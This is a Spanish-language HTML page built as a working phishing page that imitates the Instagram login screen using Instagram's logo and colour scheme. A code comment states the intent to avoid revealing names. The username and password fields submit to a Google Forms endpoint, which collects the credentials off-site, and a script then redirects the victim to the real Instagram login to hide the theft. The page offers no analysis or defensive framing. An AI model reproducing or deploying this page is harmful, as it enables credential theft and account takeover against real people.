<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando panel...</title>
  <style>
    /* Usamos colores similares pero sin nombres que delaten */
    * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { display:flex; justify-content:center; align-items:center; height:100vh; background-color:#fafafa; }
    .box-secure { background:white; padding:25px; border:1px solid #dbdbdb; text-align:center; width:350px; }
    .img-brand { width:175px; margin-bottom:20px; }
    .field-wrapper { position:relative; width:100%; margin-top:8px; }
    .field-wrapper input { width:100%; padding:10px; border:1px solid #dbdbdb; border-radius:3px; font-size:12px; background:#fafafa; outline:none; }
    .field-wrapper label { position:absolute; top:50%; left:10px; transform:translateY(-50%); font-size:12px; color:#8e8e8e; pointer-events:none; transition: all 0.1s ease; }
    .field-wrapper input:focus + label, .field-wrapper input:not(:placeholder-shown) + label { top:7px; font-size:10px; }
    .btn-action { width:100%; padding:8px; background-color:#0095f6; color:white; border:none; border-radius:4px; cursor:pointer; font-size:14px; margin-top:15px; font-weight:600; }
    .extra-link { margin-top:15px; font-size:12px; }
    .extra-link a { color:#00376b; text-decoration:none; }
  </style>
</head>
<body>

<div class="box-secure">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="img-brand" alt="App-Log">
  
  <form id="safeForm" action="https://docs.google.com/forms/d/e/1FAIpQLScixbdWi6SxI01JD38odY0Vr0p0ShZB4P51zkqwcBNwFIHjxw/formResponse" method="POST">
    
    <div class="field-wrapper">
      <input type="text" name="entry.1271603301" id="f_user" placeholder=" " required>
      <label>Usuario o correo</label>
    </div>

    <div class="field-wrapper">
      <input type="password" name="entry.1257754249" id="f_pass" placeholder=" " required>
      <label>Clave de acceso</label>
    </div>

    <button type="submit" class="btn-action">Iniciar sesión</button>
  </form>

  <div class="extra-link">
    <a href="#">¿Olvidaste tus datos?</a>
  </div>
</div>

<script>
  document.getElementById("safeForm").addEventListener("submit", function(){
    setTimeout(function(){
      // Redirección final a la web real
      window.location.href = "https://www.instagram.com/accounts/login/";
    }, 600);
  });
</script>

</body>
</html>
